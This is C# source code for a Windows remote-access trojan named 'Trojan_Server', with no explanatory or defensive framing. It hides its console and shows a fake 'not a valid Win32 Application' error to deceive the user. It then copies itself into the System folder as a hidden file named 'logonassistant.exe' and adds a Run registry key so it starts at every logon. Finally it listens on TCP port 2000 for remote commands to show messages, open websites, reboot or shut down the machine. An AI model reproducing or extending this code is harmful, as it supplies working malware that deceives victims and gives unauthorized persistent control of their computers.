using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.IO;
using Microsoft.Win32;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace Trojan_Server
{
    class Program
    {
public static NetworkStream Reciver;
        [DllImport("kernel32.dll")]
        public static extern bool FreeConsole();
        public static void Recive()
        {
            while (true)
            {
                try
                {
                    byte[] RecPacket = new byte[1000];
                    Reciver.Read(RecPacket, 0, RecPacket.Length);
                    Reciver.Flush();
                    string Command = Encoding.ASCII.GetString(RecPacket);
                    string[] CommandArray = System.Text.RegularExpressions.Regex.Split(Command, "!!!!---");
                    Command = CommandArray[0];
                    switch(Command)
                    {
                        case "MESSAGE":
                            string Msg = CommandArray[1];
                            System.Windows.Forms.MessageBox.Show(Msg.Trim('\0'));
                            break;
                        case "OPENSITE":
                            string Site = CommandArray[1];
                            System.Diagnostics.Process IE = new System.Diagnostics.Process();
                            IE.StartInfo.FileName = "iexplore.exe";
                            IE.StartInfo.Arguments = Site.Trim('\0');
                            IE.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Maximized;
                            IE.Start();
                            break;
                        case "REBOOT":
                            string RebootTime = CommandArray[1];
                            System.Diagnostics.Process reboot = new System.Diagnostics.Process();
                            reboot.StartInfo.FileName = "shutdown";
                            reboot.StartInfo.Arguments = "-r -t " + RebootTime.Trim('\0');
                            reboot.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Maximized;
                            reboot.Start();
                            break;
                        case "SHUTDOWN":
                            string ShutdownTime = CommandArray[1];
                            System.Diagnostics.Process shutdown = new System.Diagnostics.Process();
                            shutdown.StartInfo.FileName = "shutdown";
                            shutdown.StartInfo.Arguments = "-s -t " + ShutdownTime.Trim('\0');
                            shutdown.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Maximized;
                            shutdown.Start();
                            break;
                    }
                }
                catch
                {
                    break;

                }
            }
        }
        public static bool CheckIfRan()
        {
            bool IsRan = false;
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe")) { 
                RegistryKey k = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
                if (k.GetValue("logonassist") != null)
                {
                    IsRan = true;
                }
                else
                {
                    IsRan = false;
                }
            }
            return IsRan;
        }
        public static void AddToStartup()
        {
            try
            {
                File.Copy(Convert.ToString(System.Reflection.Assembly.GetExecutingAssembly().Location), Convert.ToString(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe"), true);
                File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe", FileAttributes.Hidden);
                File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe", FileAttributes.System);
                File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe", FileAttributes.ReadOnly);
                RegistryKey k = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                k.SetValue("logonassist", Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe", RegistryValueKind.String);
                k.Close();
            }
            catch
            {

            }
            
        }

        static void Main(string[] args)
        {
            FreeConsole();
            bool Check = CheckIfRan();
            if (!Check)
            {
                System.Windows.Forms.MessageBox.Show("This Programm is not a valid Win32 Application!", "Error", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error);
                AddToStartup();
                TcpListener l = new TcpListener(2000);
                l.Start();
                TcpClient Connection = l.AcceptTcpClient();
                Reciver = Connection.GetStream();
                System.Threading.Thread Rec = new System.Threading.Thread(new System.Threading.ThreadStart(Recive));
                Rec.Start();
            }
        }
    }
}
